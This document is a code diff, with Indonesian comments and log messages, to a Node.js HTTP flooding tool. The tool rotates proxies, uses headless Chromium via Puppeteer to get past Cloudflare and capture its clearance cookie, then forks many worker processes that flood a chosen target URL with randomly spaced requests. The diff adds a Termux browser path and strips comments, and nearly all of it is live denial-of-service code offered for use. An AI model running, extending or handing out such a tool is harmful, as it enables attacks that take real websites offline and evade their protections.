@@ -26,7 +26,7 @@ if (process.argv.length < 7) {
 const args = {
   target: process.argv[2],
   duration: parseInt(process.argv[3]),
-  rate: parseInt(process.argv[4]),   // total request per detik per worker
+  rate: parseInt(process.argv[4]),
   threads: parseInt(process.argv[5]),
   proxySource: process.argv[6]
 };
@@ -162,10 +162,14 @@ async function checkProxy(proxy, targetHost) {
 }
 
 // ==================== CLOUDFLARE BYPASS (PUPPETEER) ====================
+// Menggunakan executablePath dari environment atau default Termux
+const PUPPETEER_EXEC_PATH = process.env.PUPPETEER_EXECUTABLE_PATH || '/data/data/com.termux/files/usr/bin/chromium';
+
 async function getCloudflareCookie(targetUrl, proxy = null) {
   console.log(`[CF-Bypass] Mencoba cookie melalui ${proxy || 'tanpa proxy'}`);
   const browser = await puppeteer.launch({
     headless: true,
+    executablePath: PUPPETEER_EXEC_PATH,
     args: proxy ? [`--proxy-server=http://${proxy}`] : [],
     ignoreHTTPSErrors: true,
   });
@@ -268,7 +272,6 @@ function runFlooder(cookie, proxyManager, parsedTarget) {
     });
 
     client.on('connect', () => {
-      // Kirim request dengan jeda acak antar request
       let sent = 0;
       const sendNext = () => {
         if (sent >= args.rate) return;
@@ -278,7 +281,6 @@ function runFlooder(cookie, proxyManager, parsedTarget) {
         req.on('error', () => {});
         req.end();
         sent++;
-        // Jeda acak antara 50-300ms
         const delay = randomInt(50, 300);
         setTimeout(sendNext, delay);
       };
@@ -313,17 +315,15 @@ if (cluster.isMaster) {
     const proxyManager = new ProxyManager(rawProxies);
     const parsedTarget = new URL(args.target);
 
-    // Health check awal
     console.log('[Proxy] Melakukan health check awal...');
     let alive = 0;
-    for (const p of rawProxies.slice(0, 20)) { // periksa 20 proxy pertama
+    for (const p of rawProxies.slice(0, 20)) {
       const ok = await checkProxy(p, parsedTarget.hostname);
       if (ok) alive++;
       else proxyManager.mark(p, false);
     }
     console.log(`[Proxy] ${alive} proxy hidup dari ${rawProxies.length}`);
 
-    // Dapatkan cookie
     let cookie = null;
     const aliveProxies = rawProxies.filter(p => proxyManager.proxies.get(p).alive);
     for (const p of aliveProxies.slice(0, 5)) {
@@ -334,27 +334,23 @@ if (cluster.isMaster) {
     if (!cookie) { console.log('[Fatal] Gagal melewati Cloudflare.'); process.exit(1); }
     console.log(`[Master] Cookie: ${cookie.value}`);
 
-    // Fork worker
     for (let i = 1; i <= args.threads; i++) {
       const worker = cluster.fork();
       worker.send({ cookie, proxies: rawProxies });
     }
 
-    // Timer durasi
     setTimeout(() => {
       console.log(`\n[Master] Waktu habis. Menghentikan semua worker.`);
       for (const id in cluster.workers) cluster.workers[id].kill();
       process.exit(0);
     }, args.duration * 1000);
 
-    // Monitor
     setInterval(() => {
       console.log(`[Master] Worker: ${Object.keys(cluster.workers).length}, Proxy hidup: ${proxyManager.getAliveCount()}`);
     }, 10000);
   })();
 
 } else {
-  // Worker
   let cookie = null, proxyArray = [];
   process.on('message', (msg) => {
     if (msg.cookie) cookie = msg.cookie;
@@ -366,4 +362,4 @@ if (cluster.isMaster) {
       setInterval(() => runFlooder(cookie, manager, parsedTarget), 100);
     }
   });
-}
+      }
